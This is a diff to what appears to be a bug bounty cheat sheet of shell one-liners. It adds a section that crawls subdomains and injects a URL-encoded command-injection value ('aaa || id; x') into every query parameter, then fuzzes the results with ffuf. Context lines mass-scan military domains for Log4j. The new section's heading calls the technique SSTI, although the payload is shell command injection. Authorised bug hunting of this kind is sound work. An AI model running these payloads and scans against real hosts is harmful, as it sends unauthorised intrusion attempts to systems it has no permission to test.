@@ -113,6 +113,14 @@ bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa
 bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
 ```
 
+###  SSTI in qsreplase add "{{7*7}}" (0xJin)
+
+```bash
+cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
+
+```
+
 ###  Airixss XSS 
 - [Explained command](https://bit.ly/3tq5Hfv)
 ```bash
